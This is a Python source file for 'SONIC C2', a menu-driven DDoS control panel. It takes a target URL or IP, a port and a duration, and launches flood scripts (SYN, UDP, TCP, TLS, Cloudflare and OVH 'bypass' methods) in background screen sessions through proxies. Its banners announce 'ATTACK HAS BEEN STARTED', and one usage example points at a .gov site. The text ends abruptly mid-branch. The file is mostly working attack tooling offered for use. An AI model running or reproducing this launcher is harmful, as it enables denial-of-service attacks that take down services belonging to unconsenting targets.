import socket
import requests
import random
import getpass
import subprocess
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
from pystyle import Colors, Colorate, Center
from asciimatics.effects import BannerText, Print, Scroll
from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.exceptions import ResizeScreenError, StopApplication
import getpass
from time import sleep
from operator import index
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json


def mthd(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "./core/atk.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=0.5),
    ]
    scenes.append(Scene(effects, 56))

    screen.play(scenes, stop_on_resize=False, repeat=False)
    
def mli(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "./core/mulai.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=1),

    ]
    scenes.append(Scene(effects, 20))

    screen.play(scenes, stop_on_resize=False, repeat=False)

def metode(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "./core/metode.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=0.5),
    ]
    scenes.append(Scene(effects, 20))

    screen.play(scenes, stop_on_resize=False, repeat=False)


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def si():
    print('         \033[36m[ SONIC \033[36m] | \033[37m Welcome to SONIC PN! \033[36m| \033[37mOwner: the reroatzx \033[36m| \033[37mUpdate v3.1')
    print("")

def vip():
    clear()
    Screen.wrapper(metode)
    print(f'''
\033[36m                                       ╦  ╦ ╦ ╔═╗
 \033[37m                                      ╚╗╔╝ ║ ╠═╝
\033[36m                                        ╚╝  ╩ ╩
 \033[36m                     ╔═════════════╗╔═════════════╗╔═════════════╗
\033[36m                      ║ \033[37m120 SEC MAX \033[36m║║\033[37m 120 SEC MAX \033[36m║║\033[37m 120 SEC MAX \033[36m║
\033[36m                      ║═════════════║║═════════════║║═════════════║
\033[36m                      ║\033[37m•SONIC-ST    \033[36m║║\033[37m•SONIC-GOV-v2\033[36m║║\033[37m•SONIC-ACK   \033[36m║
\033[36m                      ║\033[37m•SONIC-GOV   \033[36m║║\033[37m•TLS-V2      \033[36m║║\033[37m•SONIC-STORM \033[36m║
\033[36m                      ║\033[37m•SONIC-NUKE  \033[36m║║\033[37m•CFKILL-V2   \033[36m║║\033[37m•OVERLOAD    \033[36m║
\033[36m                      ║\033[37m•BROWSER     \033[36m║║\033[37m•NUKE-V2     \033[36m║║\033[37m•SONIC-FLOOD \033[36m║
\033[36m                      ║\033[37m•SONIC-BYPASS\033[36m║║\033[37m•OVH-BAN     \033[36m║║\033[37m•SONIC-KILLER\033[36m║
\033[36m                      ║\033[37m•SONIC-RAW   \033[36m║║\033[37m•MULTI-BYPASS\033[36m║║\033[37m•JS-BYPASS   \033[36m║
 \033[36m                     ║             ║║             ║║             ║
\033[36m                      ╚═════════════╝╚═════════════╝╚═════════════╝
''')
    
def raw():
    clear()
    Screen.wrapper(metode)
    print(f'''
 \033[36m                                   ╦═╗ ╔═╗ ╦ ╦
  \033[37m                                  ╠╦╝ ╠═╣ ║║║
   \033[36m                                 ╝╚═ ╩ ╩ ╚╩╝

 \033[36m                                 ╔═════════════╗
\033[36m                                  ║ \033[37m120 SEC MAX \033[36m║
\033[36m                                  ║═════════════║
\033[36m                                  ║\033[37m•TCP-RAW     \033[36m║
\033[36m                                  ║\033[37m•UDP-RAW     \033[36m║
\033[36m                                  ║\033[37m•STD-RAW     \033[36m║
\033[36m                                  ║\033[37m•SYN-RAW     \033[36m║
 \033[36m                                 ║\033[37m•            \033[36m║
\033[36m                                  ║\033[37m•            \033[36m║
 \033[36m                                 ║             \033[36m║
\033[36m                                  ╚═════════════╝

''')

def help():
    clear()
    Screen.wrapper(metode)
    print("""
\033[36m                              ╦ ╦╔═╗\033[37m╦  ╔═╗
\033[36m                              ╠═╣║╣ \033[37m║  ╠═╝
\033[36m                              ╩ ╩╚═╝\033[37m╩═╝╩
\033[36m             ╔══════════════╦════════════════════════════╗
\033[36m           ╔═╣   \033[37mCOMMANDS   \033[36m║         \033[37mDESCRIPTION        \033[36m╠═╗
\033[36m           ║\033[37mH\033[36m╠══════════════╬════════════════════════════╣\033[37mM\033[36m║
\033[36m           ║\033[37mE\033[36m║ \033[37mvip          \033[36m║ \033[37mShow Vip Methods           \033[36m║\033[37mE\033[36m║
\033[36m           ║\033[37mL\033[36m║ \033[37mraw          \033[36m║ \033[37mShow Raw Methods           \033[36m║\033[37mN\033[36m║
\033[36m           ║\033[37mP\033[36m║ \033[37maccount      \033[36m║\033[37m Account Infomation         \033[36m║\033[37mU\033[36m║
\033[36m           ╚═╣ \033[37mcls          \033[36m║ \033[37mBack To Main Page          \033[36m╠═╝
\033[36m             ╚══════════════╩════════════════════════════╝
""")

def menu():
    sys.stdout.write(f"         \x1b]2;SONIC C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [29] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('\033[36m[ SONIC \033[36m] | \033[37m Welcome to SONIC C2! \033[36m| \033[37mOwner: the reroatzx \033[36m| \033[37mUpdate v3.1')
    print("")
    print("""
\033[36m                                ╔═╗ ╔═╗ ╔╗\033[37m╔ ╦ ╔═╗
\033[36m                                ╚═╗ ║ ║ ║║\033[37m║ ║ ║
\033[36m                                ╚═╝ ╚═╝ ╝╚\033[37m╝ ╩ ╚═╝
\033[36m              ╚╦═════╦═══════════════════════════════════╦══════╦╝
\033[36m                ╔════╩═══════════════════════════════════╩═════╗
\033[36m                ║              \033[37mWelcome to SonicC2              \033[36m║
\033[36m                ║\033[37m- - - - - TYPE "HELP" TO GET STARTED - - - - -\033[36m║
\033[36m                ╚════╦═══════════════════════════════════╦═════╝
\033[36m                     ║ \033[37m- - CONNECTION [ESTABHILISED] - - \033[36m║
\033[36m                    ╔╩═══════════════════════════════════╩╗
\033[36m           ╚╦═══════╩═════════════════════════════════════╩════════╦╝
\033[36m            ║               \033[37mPowered By The Reroatzx                \033[36m║
\033[36m            ║    \033[37mCopyright © 2022 Reroatzx All Rights Reseved      \033[36m║
\033[36m            ╚═══╦══════════════════════════════════════════════╦═══╝
\033[36m         ╚══════╩══════════════════════════════════════════════╩══════╝
""")


def p():
    menu()
    while(True):
        cnc = input('''\033[36m╔══[\033[37msonic\033[36m@\033[37mroot\033[36m]
\033[36m╚════\033[37m➤\033[37m ''')
        if cnc == "vip" or cnc == "Vip" or cnc == "VIP" or cnc == "viP":
            vip()
        elif cnc == "raw" or cnc == "RAW" or cnc == "Raw" or cnc == "raW" or cnc == "RaW" or cnc == "rAw":
            raw()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            p()
        elif cnc == "help" or cnc == "HELP" or cnc == "HEELP" or cnc == "HELPP":
            help()

                
#stop#
        elif "stop" in cnc:
            try:
                subprocess.run(['pkill screen'], shell=True)
                print(f" [!] Attack Stopped!")
            except IndexError:
                print('stop')
                
#RAW#

        elif "syn-raw" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm python3 ./core/syn {url} {port} {time} 200'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                   TARGET   : [ {url} ]
 \033[37m                  TIME     : [ {time} ]
 \033[37m                  METHOD   : [ SYN-RAW ]
 \033[37m                  FPS      : [ -1 UNLIMITED ]
 \033[37m                  COOLDOWN : [ 0 ]
  \033[37m                 VIP      : [ \033[32mTrue\033[37m ]
\033[37m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
            except IndexError:
                print("Usage : synraw <ip> <port> <time>")
                print("Example : synraw 1.1.1.1 80 60")

        elif "std-raw" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm python3 ./core/vse {url} {port} {time} 200'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
   \033[37m                TARGET   : [ {url} ]
  \033[37m                 TIME     : [ {time} ]
 \033[37m                  METHOD   : [ STD-RAW ]
  \033[37m                 FPS      : [ -1 UNLIMITED ]
  \033[37m                 COOLDOWN : [ 0 ]
 \033[37m                  VIP      : [ \033[32mTrue\033[37m ]
  \033[37m                 USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
            except IndexError:
                print("Usage : stdraw <ip> <port> <time>")
                print("Example : stdraw 1.1.1.1  80 60")
                
                
        elif "udp-raw" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(mthd)
                os.system("cls" if os.name == "nt" else "clear")
                subprocess.run([f'screen -dm perl ./core/TCP-SYN.pl {url} {port} 65500 {time}'], shell=True)
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[37m                  TARGET   : [ {url} ]
 \033[37m                  TIME     : [ {time} ]
 \033[37m                  METHOD   : [ UDP-RAW ]
 \033[37m                  FPS      : [ -1 UNLIMITED ]
  \033[37m                 COOLDOWN : [ 0 ]
\033[37m                   VIP      : [ \033[32mTrue\033[37m ]
\033[37m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
            except IndexError:
                print("Usage : udpraw <ip> <port> <time>")
                print("Example : udpraw 1.1.1.1 80 60")

        elif "tcp-raw" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm python3  ./core/tcp {url} {port} {time} 1000 200'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                   TARGET   : [ {url} ]
\033[37m                   TIME     : [ {time} ]
\033[37m                   METHOD   : [ TCP-RAW]
\033[37m                   FPS      : [ -1 UNLIMITED ]
\033[37m                   COOLDOWN : [ 0 ]
\033[37m                   VIP      : [ \033[32mTrue\033[37m ]
\033[37m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
            except IndexError:
                print("Usage : tcpraw <url> <port> <time>")
                print("Example : tcpraw http://example.com  80 60")

#VIP#

        elif "cfkill-v2" in cnc:
            try:
                url=cnc.split()[1]
                time=cnc.split()[2]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm node ./core/cfkill-v2 {url} core/https.txt {time} 1000'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                   TARGET   : [ {url} ]
\033[37m                   TIME     : [ {time} ]
\033[37m                   METHOD   : [ CFKILL-V2 ]
\033[37m                   FPS      : [ -1 UNLIMITED ]
\033[37m                   COOLDOWN : [ 0 ]
 \033[37m                  VIP      : [ \033[32mTrue\033[37m ]
   \033[37m                USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print("Usage : cfkill-v2 <url> <time>")
                print("Example : cfkill-v2 http://example.com 60")

        elif "nuke-v2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(mthd)
                os.system("cls" if os.name == "nt" else "clear")
                subprocess.run([f'screen -dm node ./core/HTTP-GOV.js {url} 50000 {time}'], shell=True)
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                   TARGET   : [ {url} ]
\033[37m                   TIME     : [ {time} ]
\033[37m                   METHOD   : [ NUKE-V2 ]
\033[37m                   FPS      : [ -1 UNLIMITED ]
\033[37m                   COOLDOWN : [ 0 ]
 \033[37m                  VIP      : [ \033[32mTrue\033[37m ]
   \033[37m                USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: nuke-v2 <url> <time>')
                print('Example: nuke-v2 http://example.com 60 ')

        elif "ovh-ban" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(mthd)
                os.system("cls" if os.name == "nt" else "clear")
                subprocess.run([f'screen -dm node ./core/HTTP-GOV.js {url} 50000 {time}'], shell=True)
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                   TARGET   : [ {url} ]
 \033[37m                  TIME     : [ {time} ]
\033[37m                   METHOD   : [ OVH-BAN ]
\033[37m                   FPS      : [ -1 UNLIMITED ]
 \033[37m                  COOLDOWN : [ 0 ]
  \033[37m                 VIP      : [ \033[32mTrue\033[37m ]
 \033[37m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: ovh-ban <url> <time>')
                print('Example: ovh-ban http://example.com 60 ')

        elif "tls-v2" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm node ./core/tls.js {url} {port} {time}'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                   TARGET   : [ {url} ]
\033[37m                   PORT     : [ {port} ]
\033[37m                   TIME     : [ {time} ]
 \033[37m                  METHOD   : [ TCP-RAW ]
\033[37m                   FPS      : [ -1 UNLIMITED ]
 \033[37m                  COOLDOWN : [ 0 ]
\033[37m                   VIP      : [ \033[32mTrue\033[37m ]
 \033[37m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print("Usage : tls-v2 <url> <port> <time>")
                print("Example : tls-v2 http://example.com 443 60")
                

        elif "sonic-gov-v2" in cnc:
            try:
                url = cnc.split()[1]
                req = cnc.split()[2]
                time = cnc.split()[3]
                Screen.wrapper(mthd)
                os.system("cls" if os.name == "nt" else "clear")
                subprocess.run([f'screen -dm node ./core/HTTP-GOV.js {url} 50000 {time}'], shell=True)
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[37m                  TARGET   : [ {url} ]
\033[37m                   TIME     : [ {time} ]
 \033[37m                  METHOD   : [ SONIC-GOV ]
\033[37m                   FPS      : [ -1 UNLIMITED ]
  \033[37m                 COOLDOWN : [ 0 ]
 \033[37m                  VIP      : [ \033[32mTrue\033[37m ]
\033[37m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
            except IndexError:
                print('Usage: sonic-gov-v2 <url> <time>')
                print('Example: sonic-gov-v2 http://example.gov 60 ')

        elif "sonic-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm node ./core/HTTP-RAW.js {url} {time} POST'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[37m                  TARGET   : [ {url} ]
\033[37m                   TIME     : [ {time} ]
 \033[37m                  METHOD   : [ SONIC-RAW ]
\033[37m                   FPS      : [ -1 UNLIMITED ]
\033[37m                   COOLDOWN : [ 0 ]
 \033[37m                  VIP      : [ \033[32mTrue\033[37m ]
 \033[37m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: sonic-raw <url> <time>')
                print('Example: sonic-raw http://example.com 20 ')
                
        elif "browser" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm node ./core/BROWSER.js {url} {time} 1000 proxy.txt'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[37m                  TARGET   : [ {url} ]
\033[37m                   TIME     : [ {time} ]
\033[37m                   METHOD   : [ BROWSER ]
\033[37m                   FPS      : [ -1 UNLIMITED ]
\033[37m                   COOLDOWN : [ 0 ]
\033[37m                   VIP      : [ \033[32mTrue\033[37m ]
\033[37m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: browser <url> <time>')
                print('Usage: browser https://exame.com 60')

        elif "sonic-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm node ./core/HTTP-BYPASS.js {url} {time}'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[37m                 TARGET   : [ {url} ]
 \033[37m                  TIME     : [ {time} ]
\033[37m                   METHOD   : [ SONIC-BYPASS ]
 \033[37m                  FPS      : [ -1 UNLIMITED ]
 \033[37m                  COOLDOWN : [ 0 ]
\033[37m                   VIP      : [ \033[32mTrue\033[37m ]
 \033[37m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: sonic-bypass <url> <time>')
                print('Example: sonic-bypass http://example.com 20')
                
               
        elif "sonic-nuke" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm node ./core/sonic.js {url} {time}'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                   TARGET   : [ {url} ]
\033[37m                   TIME     : [ {time} ]
 \033[37m                  METHOD   : [ NUKE ]
 \033[37m                  FPS      : [ -1 UNLIMITED ]
 \033[37m                  COOLDOWN : [ 0 ]
 \033[37m                  VIP      : [ \033[32mTrue\033[37m ]
\033[37m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print("Usage: sonic-nuke <url> <time>")
                print("Example: sonic-nuke http://example.com 10")
                
        elif "sonic-ack" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm node ./core/sonic.js {url} {time}'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                   TARGET   : [ {url} ]
\033[37m                   TIME     : [ {time} ]
 \033[37m                  METHOD   : [ ACK ]
 \033[37m                  FPS      : [ -1 UNLIMITED ]
 \033[37m                  COOLDOWN : [ 0 ]
 \033[37m                  VIP      : [ \033[32mTrue\033[37m ]
\033[37m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print("Usage: sonic-ack <url> <time>")
                print("Example: sonic-ack http://example.com 10")

        elif "sonic-storm" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm node ./core/sonic.js {url} {time}'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                   TARGET   : [ {url} ]
\033[37m                   TIME     : [ {time} ]
 \033[37m                  METHOD   : [ STORM ]
 \033[37m                  FPS      : [ -1 UNLIMITED ]
 \033[37m                  COOLDOWN : [ 0 ]
 \033[37m                  VIP      : [ \033[32mTrue\033[37m ]
\033[37m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print("Usage: sonic-storm <url> <time>")
                print("Example: sonic-storm http://example.com 10")

        elif "overload" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm node ./core/sonic.js {url} {time}'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                   TARGET   : [ {url} ]
\033[37m                   TIME     : [ {time} ]
 \033[37m                  METHOD   : [ OVERLOAD ]
 \033[37m                  FPS      : [ -1 UNLIMITED ]
 \033[37m                  COOLDOWN : [ 0 ]
 \033[37m                  VIP      : [ \033[32mTrue\033[37m ]
\033[37m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print("Usage: overload <url> <time>")
                print("Example: overload http://example.com 10")

        elif "sonic-flood" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm node ./core/sonic.js {url} {time}'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                   TARGET   : [ {url} ]
\033[37m                   TIME     : [ {time} ]
 \033[37m                  METHOD   : [ FLOOD ]
 \033[37m                  FPS      : [ -1 UNLIMITED ]
 \033[37m                  COOLDOWN : [ 0 ]
 \033[37m                  VIP      : [ \033[32mTrue\033[37m ]
\033[37m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print("Usage: sonic-flood <url> <time>")
                print("Example: sonic-flood http://example.com 10")

        elif "sonic-killer" in cnc:
            try:
